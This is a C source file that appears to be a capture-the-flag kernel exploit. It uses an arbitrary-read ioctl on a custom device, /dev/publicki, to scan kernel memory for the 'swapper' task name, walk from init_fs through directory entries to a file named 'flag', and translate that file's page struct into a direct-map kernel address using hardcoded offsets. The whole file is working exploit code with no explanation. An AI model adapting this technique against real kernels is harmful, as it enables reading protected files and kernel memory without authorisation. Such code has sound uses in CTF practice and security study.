#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/xattr.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>
#include <assert.h>
#include <sched.h>

typedef struct request{
  void* addr;
  void* buf;
  int size;
} req_t;

int fd;

void die(char* msg){
    perror(msg);
    exit(0);
}

int read_helper(void* addr, unsigned long* ret, int cmd){
    req_t a;
    a.size = 8;
    a.addr = addr;
    a.buf = ret;
    return ioctl(fd, cmd, &a);
}

unsigned long read_inode(void* inode){
    unsigned long value = 0x1337;
    int ret = read_helper(inode, &value, 0x1235);
    if (ret){
        printf("Cannot read inode @%p\n", inode);
        exit(0);
    }
    return value;
}

unsigned long read8(void* addr){
    unsigned long value = 0x1337;
    int ret = read_helper(addr, &value, 0x1234);
    if (ret){
        printf("Cannot read @%p\n", addr);
        exit(0);
    }
    return value;
}

int setup(){
    fd = open("/dev/publicki", O_RDONLY);
    if(fd < 0){
        die("open");
    };
}

int main(int argc, char** argv){
    unsigned long kernel_bss_base;
    unsigned long kernel_text = 0xffffffff81000000;
    setup();

    if(argc != 2){
    }
    else{
        char *ptr;
        kernel_text = strtoul(argv[1], &ptr, 16);
    }
    kernel_bss_base = 0x1400000 + kernel_text;

    unsigned long swapper_string = 0;
    int i = 0;
    unsigned long val;
    while(1){
        printf("%p\r", (void*)(kernel_bss_base + i * 8));
        val = read8((void*)(kernel_bss_base + i * 8));
        if (val == 0x2f72657070617773){
            swapper_string = kernel_bss_base + i * 8;
            printf("[+] Found \"swapper\" string @ %p\n", swapper_string);
            break;
        }
        i++;
    }

    unsigned long init_fs = read8((void*)(swapper_string + 0x40));  // This might vary?
    assert(init_fs >> 48 == 0xffff);
    printf("[+] init_fs @ %p\n", init_fs);

    unsigned long root_dentry = read8((void*)(init_fs + 0x20));  // may vary again
    printf("[+] init_fs->root.dentry @ %p\n", root_dentry);

    unsigned long curr_filename_ptr = 0;
    unsigned long curr_filename = 0;
    unsigned long dummy = 0;
    unsigned long curr_dentry = root_dentry;
    unsigned long next = root_dentry + 0xa0;  // offset d_subdir
    for(int i = 0; i < 30; i++){
        curr_filename_ptr = read8((void*)(curr_dentry + 0x28));  // d_name, points to d_iname
        curr_filename = read8((void*)(curr_filename_ptr));
        printf("[+] Current filename is :\"%s\" %p\n", &curr_filename, curr_filename);
        if(curr_filename == 0x67616c66){  // flag
            break;
        }
        for(int j = 0; j < i + 1; j++){
            next = read8((void*)next);
        }
        curr_dentry = next - 0xa0 + 0x10;  // 0x10 = offset d_subdir - offset d_child
        // printf("[+] Next entry is %p\n", curr_dentry);
    }
    if(!curr_filename){
        puts("Cannot find file");
        exit(0);
    }

    unsigned long flag_dentry = curr_dentry;
    unsigned long inode = read8((void*)(flag_dentry + 0x30));  // may vary
    printf("[+] Found flag's dentry @%p\n", flag_dentry);
    printf("[+] inode is @%p\n", inode);

    unsigned long inode_addr_space = read8((void*)(inode + 0x30));
    printf("[+] inode->i_mapping is @%p\n", inode_addr_space);
    unsigned long page_struct = read8((void*)(inode_addr_space + 0x10));
    printf("[+] page_struct is at @%p\n", page_struct);

    unsigned long page_offset_base = read8((void*)(kernel_text + 0x11980a0));  // page_offset_base
    unsigned long vmemmap_base = read8((void*)(kernel_text + 0x1198090));  // vmemmap_base
    unsigned long file_page = (((page_struct - vmemmap_base) >> 6) << 12) + page_offset_base;
    printf("[+] file page is @%p\n", file_page);
}